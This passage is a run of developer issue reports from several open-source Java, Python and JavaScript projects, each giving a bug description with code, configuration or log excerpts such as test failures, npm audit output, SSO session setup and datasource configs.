_ _ ../share/ops/primitive/segmentsum_ops.py:82: in forward_cmp allclose_nparray(out_tf, out_mindspore, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[ 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0...57, 42, 45, 61, 34, 17, 99, 66, 14, 82, 26, 26, 44, 53, 59, 44, 87, 11, 65, 78, 7, 40, 74, 53]], dtype=uint16) data_me = array([[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ...0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]], dtype=uint16) rtol = 0, atol = 0 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[81 83 18 79 67 10 4 71 16 8 30 84 99 55 30 19 14 64 16 42 20 95 27 6 E 77 81 10 47 3 78 5 39 48 57 42 45 61 34 17 99 66 14 82 26 26 44 53 59 E 44 87 11 65 78 7 40 74 53] E data_me_error:[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 E 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0] E loss:[81 83 18 79 67 10 4 71 16 8 30 84 99 55 30 19 14 64 16 42 20 95 27 6 E 77 81 10 47 3 78 5 39 48 57 42 45 61 34 17 99 66 14 82 26 26 44 53 59 E 44 87 11 65 78 7 40 74 53]"
关于调用第三方系统接口,"环境信息 pigx版本: 3.8 是否修改包名: 是 提供详细 调用第三方系统(也是使用的pigx框架开发) 获取token接口，需要添加请求头，我这边使用 Feign 老是报 请求头中client信息为空 请问下这边请求头该怎么加？ 也尝试过在方法上直接使用 @周恒 注解，也是一样的报错   <code>: /** * 获取token * * @param username 用户名 * @param password 密码 * @param grant_type 默认值 password * @param scope 默认值 server * @return */ @RequestMapping(method = RequestMethod.POST, value = ""/auth/oauth/token"", consumes = ""application/json"", produces = ""application/json"") TokenResponse getToken(@RequestHeader Map&lt;String, String&gt; headerMap, @RequestParam(""username"") String username, @RequestParam(""password"") String password, @RequestParam(""grant_type"") String grant_type, @RequestParam(""scope"") String scope);"
微服务版本 vue前端安装依赖警告,"D:\ideaProjects2\RuoYi-Cloud\ruoyi-ui&gt;npm install npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.13 (node_modules\chokidar\node_modules\fsevents): npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.13: wanted {""os"":""darwin"",""arch"":""any""} (current: {""os"":""win32"",""arch"":""x64""}) npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.13 (node_modules\jest-haste-map\node_modules\fsevents): npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.13: wanted {""os"":""darwin"",""arch"":""any""} (current: {""os"":""win32"",""arch"":""x64""}) npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@2.1.3 (node_modules\fsevents): npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@2.1.3: wanted {""os"":""darwin"",""arch"":""any""} (current: {""os"":""win32"",""arch"":""x64""}) npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.13 (node_modules\watchpack-chokidar2\node_modules\fsevents): npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.13: wanted {""os"":""darwin"",""arch"":""any""} (current: {""os"":""win32"",""arch"":""x64""}) npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.13 (node_modules\webpack-dev-server\node_modules\fsevents): npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.13: wanted {""os"":""darwin"",""arch"":""any""} (current: {""os"":""win32"",""arch"":""x64""}) audited 1869 packages in 17.745s 54 packages are looking for funding run npm fund for details found 6 vulnerabilities (3 low, 3 high) run npm audit fix to fix them, or npm audit for details D:\ideaProjects2\RuoYi-Cloud\ruoyi-ui&gt;npm audit Low Prototype Pollution Package lodash Patched in &gt;=4.17.5 Dependency of runjs [dev] Path runjs &gt; microcli &gt; lodash More info https://npmjs.com/advisories/577 High Prototype Pollution Package lodash Patched in &gt;=4.17.11 Dependency of runjs [dev] Path runjs &gt; microcli &gt; lodash More info https://npmjs.com/advisories/782 High Prototype Pollution Package lodash Patched in &gt;=4.17.12 Dependency of runjs [dev] Path runjs &gt; microcli &gt; lodash More info https://npmjs.com/advisories/1065 Low Prototype Pollution Package lodash Patched in &gt;=4.17.19 Dependency of runjs [dev] Path runjs &gt; microcli &gt; lodash More info https://npmjs.com/advisories/1523 Low Prototype Pollution Package yargs-parser Patched in &gt;=13.1.2 &lt;14.0.0 || &gt;=15.0.1 &lt;16.0.0 || &gt;=18.1.2 Dependency of @vue/cli-plugin-unit-jest [dev] Path @vue/cli-plugin-unit-jest &gt; ts-jest &gt; yargs-parser More info https://npmjs.com/advisories/1500 High Remote Code Execution Package serialize-javascript Patched in &gt;=3.1.0 Dependency of @vue/cli-service [dev] Path @vue/cli-service &gt; copy-webpack-plugin &gt; serialize-javascript More info https://npmjs.com/advisories/1548 found 6 vulnerabilities (3 low, 3 high) in 1869 scanned packages 6 vulnerabilities require manual review. See the full report for details.   <code>: === npm audit security report === Manual Review Some vulnerabilities require your attention to resolve Visit https://go.npm.me/audit-guide for additional guidance"
单点登陆问题,"已通过单点登陆成功，只能拿到登录名，怎样在ruoyi后台绕过登陆将单点登陆信息保存若依后台管理进入首页。 出现多次重定向错误，大佬们，看看什么问题？谢谢。   <code>: SysUser user = userService.selectUserByLoginName(loginName); PrincipalCollection principals = new SimplePrincipalCollection(user, loginName); WebSubject.Builder builder = new WebSubject.Builder(request, response); builder.principals(principals); builder.authenticated(true); WebSubject subject = builder.buildWebSubject(); ThreadContext.bind(subject); return ""redirect:/index"";"
代码生成entity的toString有瑕疵,"当前使用版本 3.1.0 使用代码生成后，发现生成的entity的toString方法第一个参数前有逗号！   <code>: ""User{"" + "", id="" + id + "", roleId="" + roleId +"
手工创建作用域Scoped.Create后在作用域内部Throw抛出异常不会进入全局异常监控,"Furion 版本号 4.2.6 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 1、创建了作用域然后直接在作用域中抛出异常 2、全局的日志监控记录错误日志中不会被记录 无堆栈信息 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 像作用域外部抛出异常一样正常记录   <code>: using Furion.DependencyInjection; using Furion.FriendlyException; using Furion; using Microsoft.AspNetCore.Mvc.Filters; using Furion.DynamicApiController; using Furion.Templates; using Microsoft.Extensions.Logging; Serve.Run(""http://0.0.0.0:8082""); public class actionFileApp : IDynamicApiController { public async Task&lt;string&gt; testApi() { string result = string.Empty; Scoped.Create((f, s) =&gt; { throw new Exception(""aaa""); }); return result; } } public class logHand : IGlobalExceptionHandler, ISingleton { public Task OnExceptionAsync(ExceptionContext context) { var log = App.GetService&lt;ILogger&lt;logHand&gt;&gt;(); log.LogError( TP.Wrapper(""错误异常日志全局拦截器记录"", ""运行过程中发生的异常信息拦截记录"", $""##错误消息## {context.Exception.Message}"", $""##堆栈信息## {context.Exception.StackTrace}"", $""##源信息## {context.Exception.Source}"", $""##方法## {context.Exception.TargetSite.Name}"", $""##ClassType## {context.Exception.TargetSite.DeclaringType?.FullName}"", $""##请求方法## {context.HttpContext.Request.Method}"", $""##请求地址## {context.HttpContext.Request.Path.Value}"")); return Task.CompletedTask; } }"
组数据提示数据源数量显示错误,"JDK版本: JDK 1.8 SpringBoot版本: 2.0.5 Starter版本: 2.4.2 当前的默认数据源是组数据源,组名为slave,其下有1个数据源 重现步骤 步骤1 步骤2 步骤3   <code>: spring: datasource: dynamic: primary: slave datasource: slave_1: username: 1 password: # driver-class-name: com.mysql.jdbc.Driver url: 123 slave_2: username: 1 password: # driver-class-name: com.mysql.jdbc.Driver url: 456"
hutool 对jdk9的支持,"使用hutool版本 在jdk9环境下报错: 请问hutool是否支持jdk9,或是本人使用不当?   <code>: &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;4.0.7&lt;/version&gt; &lt;/dependency&gt; Error:(11, 20) java: 找不到模块: hutool.all"
支持在@Query，@DataFile等注解中使用隐式变量 ${_it} 、 ${_index} 和 ${_key},"支持在@Query，@DataFile等注解中使用隐式变量 、 和 和 这两个变量仅在遇到Map、List、数组等集合类型参数时有效 迭代集合时，代表集合中的每一项对象 迭代集合时, 代表每次迭代的循环计数（从零开始计） 当遇到Map以及Map为基类的类型参数时，可以使用 迭代Map时，代表Map中每一次迭代中的键值   <code>: ${_it} ${_index} ${_key} ${_it} ${_index} _it _index ${_key} _key"
More data format support in SoftmaxMKLDNNKernel,"In , and only currently only NC data format is supported. More format should be supported when necessary. [removed TODO]   <code>: softmax_mkldnn_op.cc SoftmaxMKLDNNKernel SoftmaxMKLDNNGradKernel // TODO(jczaja): Add layouts support when there is a need to do so // Two dimensional softmax does support NC format"
ClassLoaderUtil 加载内部类抛出异常,"使用的JDK版本和Hutool版本： 1.8 ， 4.1.18 文档里面 写了 类加载器是支持 加载内部类的，可是它确抛出了异常！！ 内部类，例如：java.lang.Thread.State会被转为java.lang.Thread$State加载 System.out.println(ClassLoaderUtil.loadClass(""java.lang.Thread.State"").getName()); 这样就会报错了 原因 其实是支持加载内部类的，可是源码里面 加载成功之后，依然抛出了异常 也就是加载普通类catch异常之后， 尝试 加载内部类 异常忽略了， 但是抛出了 throw new UtilException(ex); 我 debug 了一下，发现内部类是可以加载出来的，但是 抛出了异常。 而且 内部类失败，应该抛出异常吧！！！   <code>: Exception in thread ""main"" cn.hutool.core.exceptions.UtilException: ClassNotFoundException: java.lang.Thread.State at cn.hutool.core.util.ClassLoaderUtil.loadClass(ClassLoaderUtil.java:190) at cn.hutool.core.util.ClassLoaderUtil.loadClass(ClassLoaderUtil.java:124) at cn.hutool.core.util.ClassLoaderUtil.loadClass(ClassLoaderUtil.java:105) at com.core.util.TestClassLoaderUtil.main(TestClassLoaderUtil.java:12) Caused by: java.lang.ClassNotFoundException: java.lang.Thread.State at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:335) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Class.java:348) at cn.hutool.core.util.ClassLoaderUtil.loadClass(ClassLoaderUtil.java:178) ... 3 more else { // 加载普通类 if (null == classLoader) { classLoader = getClassLoader(); } try { clazz = Class.forName(name, isInitialized, classLoader); } catch (ClassNotFoundException ex) { // 尝试获取内部类，例如java.lang.Thread.State =》java.lang.Thread$State int lastDotIndex = name.lastIndexOf(PACKAGE_SEPARATOR); if (lastDotIndex &gt; 0) {// 类与内部类的分隔符不能在第一位，因此&gt;0 final String innerClassName = name.substring(0, lastDotIndex) + INNER_CLASS_SEPARATOR + name.substring(lastDotIndex + 1); try { clazz = Class.forName(innerClassName, isInitialized, classLoader); } catch (ClassNotFoundException ex2) { // 尝试获取内部类失败时，忽略之。 } } throw new UtilException(ex); } }"
[MS] [unet3d] [CPU] unet3d模型中，prelu算子和conv3dtranspose算子不支持cpu，并且自定义算子无法使用,"unet3d模型中使用的prelu算子和conv3dtranspose算子不支持cpu。 RuntimeError: mindspore\ccsrc\plugin\device\cpu\hal\device\kernel_select_cpu.cc:193 KernelNotSupportException] Unsupported op [PReLU] on CPU, Please confirm whether the device target setting is correct, or refer to the official website to query the operator support list. RuntimeError: mindspore\ccsrc\plugin\device\cpu\hal\device\kernel_select_cpu.cc:193 KernelNotSupportException] Unsupported op [Conv3DTranspose] on CPU, Please confirm whether the device target setting is correct, or refer to the official website to query the operator support list. 自定义了prelu_cpu_kernel.cc, prelu_cpu_kernel.h, prelu_grad_cpu_kernel.cc和prelu_grad_cpu_kernel.h四个算子文件，其中prelu_grad_cpu_kernel.cc报错   <code>: set(onednn_CXXFLAGS ""-D_FORTIFY_SOURCE=2 -O2"") set(onednn_CFLAGS ""-D_FORTIFY_SOURCE=2 -O2"") if(NOT MINDSPORE_PROJECT_DIR) set(MINDSPORE_PROJECT_DIR ${CMAKE_SOURCE_DIR}) endif() if(USE_MS_THREADPOOL_FOR_DNNL) set(USE_MS_THREADPOOL ""-DDNNL_CPU_RUNTIME=THREADPOOL"") else() set(USE_MS_THREADPOOL """") endif() if(ENABLE_GITEE_EULER) set(GIT_REPOSITORY ""git@gitee.com:src-openeuler/onednn.git"") set(GIT_TAG ""0d726f1"") set(MD5 ""6a062e36ea1bee03ff55bf44ee243e27"") __download_pkg_with_git(ONEDNN ${GIT_REPOSITORY} ${GIT_TAG} ${MD5}) set(ONE_DNN_SRC ""${TOP_DIR}/mindspore/lite/build/_deps/onednn-src"") execute_process(COMMAND tar -xf ${ONE_DNN_SRC}/v2.6.tar.gz --strip-components 1 -C ${ONE_DNN_SRC}) endif() if(CMAKE_SYSTEM_NAME MATCHES ""Windows"") mindspore_add_pkg(onednn VER 2.6 LIBS dnnl mkldnn HEAD_ONLY ./include RELEASE on URL http://tools.mindspore.cn/libs/dnnl/dnnl_win_2.2.0_cpu_vcomp.zip MD5 139fcdbd601a970fb86dd15b30ba5ae3) else() if(ENABLE_GITEE) set(REQ_URL ""https://gitee.com/mirrors/MKL-DNN/repository/archive/v2.6.tar.gz"") set(MD5 ""204e1b02b14124a81f31bcc2115f5776"") else() set(REQ_URL ""https://github.com/oneapi-src/oneDNN/archive/v2.6.tar.gz"") set(MD5 ""2ef4cf81912f55abfe1d45bb14a33c1c"") endif() mindspore_add_pkg(onednn VER 2.6 LIBS dnnl mkldnn URL ${REQ_URL} MD5 ${MD5} CMAKE_OPTION -DDNNL_ARCH_OPT_FLAGS='' -DDNNL_BUILD_EXAMPLES=OFF -DDNNL_BUILD_TESTS=OFF ${USE_MS_THREADPOOL} -DDNNL_ENABLE_CONCURRENT_EXEC=ON) endif() include_directories(${onednn_INC}) add_library(mindspore::dnnl ALIAS onednn::dnnl) add_library(mindspore::mkldnn ALIAS onednn::mkldnn)"
Rename OpProtoAndCheckerMaker to OpInfoMaker,"is too long and hard to understand. Change it to , because it actually fill fields in   <code>: OpProtoAndCheckerMaker OpInfoMaker OpInfo"
mapper允许传入空值的问题,"mapper接口如果要插入一个空值使得数据库的字段值为null的话。 在调用mapper接口方法上有什么办法可以让updateByPrimaryKeySelective 不忽略这种null赋值？ //test3 的运行产生sql 相当于是把全面字段都update一遍。这种情况下，update set 中有包含check_by=？ 和check_date=？ 两个属性 但是这种调用，会把对象的全部属性字段都更新一遍（这个PcInfo还有很多属性，就不列举了）~不能选择性更新。 //test4 运行结果，产生sql 为 update pc_info set id=? where id=? 。会自动忽略了check_by和check_date， XXXSelective这类接口，如何才能设置null值呢？？   <code>: @Test public void test3() throws Exception { PcInfo info = pcInfoMapper.selectByPrimaryKey(61); // info.setId(61); info.setCheckBy(null); info.setCheckDate(null); int res = pcInfoMapper.updateByPrimaryKey(info); System.out.println(""更新数量="" + res); } @Test public void test4() throws Exception { PcInfo info = new PcInfo(); info.setId(61); info.setCheckBy(null); info.setCheckDate(null); int res = pcInfoMapper.updateByPrimaryKeySelective(info); System.out.println(""更新数量="" + res); }"
静态图缺少对应fluid.layers.brelu的接口,PaddlePaddle 2.1.0 paddle.static.nn 缺少这个接口：   <code>: fluid.layers.brelu
【请教】自定义SQL分页查询报错Could not set parameters for mapping,"自定义SQL实现分页查询。传入查询条件就会报错。不传查询条件不报错。 dao xml 测试截图   <code>: IPage&lt;MatterInOutStockSumBean&gt; matterInOutStockSum( IPage&lt;MatterInOutStockSumBean&gt; page, @Param(""m"") MatterInOutSumFormBean m); &lt;select id=""matterInOutStockSum"" resultType=""com.tangyh.lamp.wms.dto.MatterInOutStockSumBean""&gt; SELECT m.`id` AS matterId, m.`name` AS matterName, m.`matter_type` AS matterType, m.`matter_no` AS matterNo, m.`model` AS model, IFNULL(a.stock_quantity, 0) AS stockQuantity, IFNULL(b.`quantity`, 0) AS quantity, IFNULL(c.`quantity`, 0) AS quantity FROM `e_wms_matter` m LEFT JOIN ( SELECT s.`matter_id` AS matter_id, SUM(s.stock_quantity) AS stock_quantity FROM `e_wms_stock` s GROUP BY s.`matter_id` ) a ON m.id = a.`matter_id` LEFT JOIN ( SELECT d.`matter_id` AS matter_id, SUM(d.`quantity`) AS quantity FROM `e_wms_order_detail` d WHERE d.`order_direction` = 'IN' &lt;if test=""null != m.startTime""&gt; AND d.`create_time` &amp;gt;= #{m.startTime} &lt;/if&gt; &lt;if test=""null != m.endTime""&gt; AND d.`create_time` &amp;lt; #{m.endTime} &lt;/if&gt; &lt;if test=""null != m.matterType""&gt; AND d.`matter_type` = #{m.matterType} &lt;/if&gt; GROUP BY d.`matter_id` ) b ON m.id = b.`matter_id` LEFT JOIN ( SELECT d.`matter_id` AS matter_id, SUM(d.`quantity`) AS quantity FROM `e_wms_order_detail` d WHERE d.`order_direction` = 'OUT' &lt;if test=""null != m.startTime""&gt; AND d.`create_time` &amp;gt;= #{m.startTime} &lt;/if&gt; &lt;if test=""null != m.endTime""&gt; AND d.`create_time` &amp;lt; #{m.endTime} &lt;/if&gt; &lt;if test=""null != m.matterType""&gt; AND d.`matter_type` = #{m.matterType} &lt;/if&gt; GROUP BY d.`matter_id` ) c ON m.id = c.`matter_id` &lt;/select&gt;"
[CT][MS][HammingWindow]GPU下输入length的类型为int8，int16，uint8，uint16，uint32，uint64时报TypeError,"输入length的类型为int8，int16，uint8，uint16，uint32，uint64时报TypeError input为IntegerDataType，应该都支持 mode graph   <code>: ''' TEST_SUMMARY: test hamming_window with all attributes default, input dtype=int usually used ''' def test_hamming_window_input_int8_attr_all_default_001(): int_dtype = [np.int16, np.int32, np.int64] for dtype in int_dtype: length = (Tensor(np.random.randint(0, 128, size=1).astype(dtype))) fact = HammingWindowMock(attributes={}, inputs=[length]) fact.forward_cmp() ''' TEST_SUMMARY: test hamming_window with all attributes default, input dtype=int unusual ''' def test_hamming_window_input_int8_attr_all_default_002(): int_dtype = [np.int8, np.uint8, np.uint16, np.uint32, np.uint64] for dtype in int_dtype: length = (Tensor(np.random.randint(0, 128, size=1).astype(dtype))) fact = HammingWindowMock(attributes={'alpha': 0.78, 'beta': 0.44}, inputs=[length]) fact.forward_cmp() E TypeError: Select GPU operator[HammingWindow] fail! Unsupported data type! E The supported data types are input[Int32], output[Float16]; input[Int64], output[Float16]; input[Int32], output[Float32]; input[Int64], output[Float32]; input[Int32], output[Float64]; input[Int64], output[Float64]; , but get input[UInt8 ] output[Float32 ] E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/gpu/hal/hardware/gpu_device_context.cc:534 SetOperatorInfo /root/miniconda3/envs/zhanglin3.7/lib/python3.7/site-packages/mindspore/common/api.py:1120: TypeError ### Environment / 环境信息 (Mandatory / 必填) - **Hardware Environment(`Ascend`/`GPU`/`CPU`) / 硬件环境**: device GPU - **Software Environment / 软件环境 (Mandatory / 必填)**: -- MindSpore version (e.g., 1.7.0.Bxxx) : -- Python version (e.g., Python 3.7.5) : -- OS platform and distribution (e.g., Linux Ubuntu 16.04): -- GCC/Compiler version (if compiled from source): - **Excute Mode / 执行模式 (Mandatory / 必填)(`PyNative`/`Graph`)**: mode pynative mode graph ### Related testcase / 关联用例 (Mandatory / 必填) ### Steps to reproduce the issue / 重现步骤 (Mandatory / 必填) 1. 2. 3. ### Describe the expected behavior / 预期结果 (Mandatory / 必填) ### Related log / screenshot / 日志 / 截图 (Mandatory / 必填) ### Special notes for this issue/备注 (Optional / 选填)"
MasterSlaveAutoRoutingPlugin 读没选择从库,"我试了好几个版本，都说一样的。 我只有2个库，进行读写分离，安装官方配置了MasterSlaveAutoRoutingPlugin后，发现只有写进入其中，而读根本不进入这个类，直接就选择了默认的库。 就这些，包版本：2.5.6,2.5.7都试了的   <code>: @Configuration public class MybatisCongfig { /** * 分页插件 */ @Bean public PaginationInterceptor paginationInterceptor() { return new PaginationInterceptor(); } @Bean public MasterSlaveAutoRoutingPlugin masterSlaveAutoRoutingPlugin(){ return new MasterSlaveAutoRoutingPlugin(); } } spring: datasource: dynamic: primary: master datasource: master: driver-class-name: com.mysql.cj.jdbc.Driver # JDBC连接Mysql6以上com.mysql.cj.jdbc.Driver url: jdbc:mysql://192.168.9.246:3306/bitbuy-dev?useSSL=false&amp;serverTimezone=GMT%2B8&amp;useUnicode=true&amp;characterEncoding=utf8 username: password: slave: driver-class-name: com.mysql.cj.jdbc.Driver # JDBC连接Mysql6以上com.mysql.cj.jdbc.Driver url: jdbc:mysql://192.168.9.247:3306/bitbuy-dev?useSSL=false&amp;serverTimezone=GMT%2B8&amp;useUnicode=true&amp;characterEncoding=utf8 username: password:"
@ApiModelProperty(hidden = true) GET下失效,"最新版本。 如 POST用json接受没问题， 在GET下文档里会显示出来， 期望hidden 的不显示   <code>: @ApiOperation(""收入统计"") @GetMapping(""/finance/statistic"") public R&lt;ArchivedOrderDetailDay&gt; financeStatistics(StatisticsMoneyDto dto) { return R.ok(xxxService.xxx(dto)); } @Data @Accessors(chain = true) public class StatisticsMoneyDto { @ApiModelProperty(value = ""查询开始时间"", example = ""2018-10-01 00:00:00"") @NotNull private LocalDateTime from; @ApiModelProperty(value = ""查询结束时间"", example = ""2018-10-30 00:00:00"") @NotNull private LocalDateTime to; @ApiModelProperty(value = ""停车点ID(非必传)"") private Long parkingLotId; @ApiModelProperty(hidden = true) private LocalDate startDate; @ApiModelProperty(hidden = true) private LocalDate endDate; @ApiModelProperty(hidden = true) private YearMonth startMonth; @ApiModelProperty(hidden = true) private YearMonth endMonth; public LocalDate getStartDate() { return from.toLocalDate(); } public LocalDate getEndDate() { return to.toLocalDate(); } public YearMonth getStartMonth() { return YearMonth.of(from.getYear(), from.getMonth()); } public YearMonth getEndMonth() { return YearMonth.of(to.getYear(), to.getMonth()); } }"
pigx-ui的一个文件无法上传到软件发布库,"pigx版本: 3.2 是否二开: 否 是否修改包名: 否   <code>: 这个文件的名字不符合华为云构建后上传到软件发布库的规范，这个文件是在哪引用的？能不能修改这个文件的名字和引用 文件位置pigx-ui\public\images\media_dialog&amp;emotion_editor&amp;msg_tab&amp;emoji&amp;msg_sender&amp;tooltip.css.bak 华为云 上传软件包到软件发布库 日志： [2019-08-30 10:08:20.358] [ERROR] [上传软件包到软件发布库:上传软件包] : DEV.CB.0236, Releaseman error: {""result"":null,""error"":{""code"":""DEV-CR-40016"",""reason"":""名称不能为空,支持中文,英文,数字,下划线(_),连字符(-)和点(.),长度200字符以内。非法名称:media_dialog&amp;emotion_editor&amp;msg_tab&amp;emoji&amp;msg_sender&amp;tooltip.css.bak""},""status"":""error""}"
JSONArray toList方法异常,"JDK版本： openjdk_8 hutool版本： 5.1.0 在toList之后,vccList长度没问题,但是每个元素都是null   <code>: [""{\""updateDate\"":1583376342000,\""code\"":\""move\"",\""id\"":1,\""sort\"":1,\""name\"":\""电影大全\""}"",""{\""updateDate\"":1583378882000,\""code\"":\""zy\"",\""id\"":3,\""sort\"":5,\""name\"":\""综艺会\""}""] //这里list的json数据在上方 List&lt;String&gt; redisList = redisUtil.lRange(key, 0, redisUtil.lLen(key)); List&lt;vcc&gt; vccList =JSONUtil.parseArray(JSONUtil.toJsonStr(redisList)).toList(vcc.class); import java.io.Serializable; import com.baomidou.mybatisplus.annotation.IdType; import com.baomidou.mybatisplus.annotation.TableId; import lombok.*; import java.util.Date; import java.util.List; @Data @NoArgsConstructor @AllArgsConstructor @Builder @EqualsAndHashCode public class vcc implements Serializable { private static final long serialVersionUID = 1L; @TableId(value = ""id"",type = IdType.AUTO) private Long id; private Date updateDate; private String code; private String name; private Integer sort; }"
同样的参数，layer.photos可以正常使用，但是top.layer.photos没反应,"实际需求：先layer.open打开一个help弹窗，再从help弹窗中显示一些图片示例。但是由于会自动基于父窗口缩略，所以要设置基于顶层显示。 图片参数固定，如： 一样的参数，一开始 layer.photos 使用的时候没问题，但是不符合实际需求。改成 top.layer.photos 后无效。 调试发现，参数传入layer后进行判断（源码1071行） 该判断在默认情况下得到结果是true，但是在top.调用的时候却一直得到结果为false，甚至在上面定义photo参数的时候加入 constructor: Object 都没有用。 但是调试时分析参数应该是object没问题，不知为何会导致这种情况。   <code>: { ""title"": """", ""id"": 1, ""start"": 0, ""data"": [ { ""alt"": ""图1"", ""pid"": 1, ""src"": ""resources/img/操作演示.gif"", ""thumb"": """" } ] } var type = options.photos.constructor === Object;"
[BUG]:X3.4版本全新安装，UCenter进不去。,"全新安装X3.4版本，系统环境: 操作系统: PHP Mysql BUG截图:   <code>: lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 16.04 LTS Release: 16.04 Codename: xenial php --version PHP 7.0.22-0ubuntu0.16.04.1 (cli) ( NTS ) Copyright (c) 1997-2017 The PHP Group Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies with Zend OPcache v7.0.22-0ubuntu0.16.04.1, Copyright (c) 1999-2017, by Zend Technologies mysql --version mysql Ver 14.14 Distrib 5.7.20, for Linux (x86_64) using EditLine wrapper"
"tpl模板中js代码if判断多个条件使用“&&”时，&会被转义成""&amp;""而报错",。tpl模板中js代码if判断多个条件使用“&amp;&amp;”时，&amp;会被转义成“&amp;amp”而报错，这里是不允许多个条件同时判断，还是有其他模板使用方式。   <code>: templet:'&lt;div&gt;{{# if(d.A &amp;&amp; d.B) return A; return B;}}&lt;/div&gt;'
下载失败后，流程／逻辑不正确。,"Spider的run()方法。 其中的processRequest方法中通过Page的downloadSuccess来判断下载是否成功。 这一属性，只在HttpClientDownloader中设置了。但PhantomJSDownloader并没有修改（始终为true）。 Downloader下载失败后，pageCount也会增加，显示Spider ｘｘｘ closed! N pages downloaded.其中，N=cycleRetryTimes。 同时，RedisScheduler中已有标记，导致再次启动同一任务后，会被去重（失败的任务，应当消除标记）。   <code>: try { processRequest(request); onSuccess(request); } catch (Exception e) { onError(request); logger.error(""process request "" + request + "" error"", e); } finally { pageCount.incrementAndGet(); signalNewUrl(); } private void processRequest(Request request) { Page page = downloader.download(request, this); if (page.isDownloadSuccess()){ onDownloadSuccess(request, page); } else { onDownloaderFail(request); } }"
[CT][MS][doc][value_and_grad] 对应官网测试样例中，有语法错误,"1, 官网链接： https://www.mindspore.cn/docs/en/master/api_python/ops/mindspore.ops.value_and_grad.html?highlight=value_and_grad#mindspore.ops.value_and_grad 对应算子测试样例中有语法错误， y = Tensor([-2, 3]), mindspore.float32) z = Tensor([0, 3]), mindspore.float32) 这里面多个右括号“）” /mode graph   <code>: _______________________________________________________ [doctest] mindspore.ops.function.grad.grad_func.value_and_grad _______________________________________________________ 234 [0. 6.] 235 &gt;&gt;&gt; 236 &gt;&gt;&gt; # Function object to be differentiated 237 &gt;&gt;&gt; def fn(x, y, z): 238 ... res = x * ops.exp(y) * ops.pow(z, 2) 239 ... return res, z 240 &gt;&gt;&gt; x = Tensor(np.array([3, 3]).astype(np.float32)) 241 &gt;&gt;&gt; y = Tensor(np.array([0, 0]).astype(np.float32)) 242 &gt;&gt;&gt; z = Tensor(np.array([5, 5]).astype(np.float32)) 243 &gt;&gt;&gt; output, inputs_gradient = value_and_grad(fn, grad_position=(1, 2), weights=None, has_aux=True)(x, y, z) UNEXPECTED EXCEPTION: NameError(""The name 'ops' is not defined, or not supported in graph mode.\n\n----------------------------------------------------\n- The Traceback of Net Construct Code:\n----------------------------------------------------\n\n# In file &lt;doctest mindspore.ops.function.grad.grad_func.value_and_grad[13]&gt;(2)\n\n----------------------------------------------------\n- C++ Call Stack: (For framework developers)\n----------------------------------------------------\nmindspore/ccsrc/pipeline/jit/parse/function_block.cc:309 HandleBuiltinNamespaceInfo\n"") Traceback (most recent call last): File ""/root/miniconda3/envs/op3.7/lib/python3.7/doctest.py"", line 1329, in __run compileflags, 1), test.globs) File ""&lt;doctest mindspore.ops.function.grad.grad_func.value_and_grad[17]&gt;"", line 1, in &lt;module&gt; File ""/root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 600, in staging_specialize out = _MindsporeFunctionExecutor(func, hash_obj, input_signature, process_obj, jit_config)(*args) File 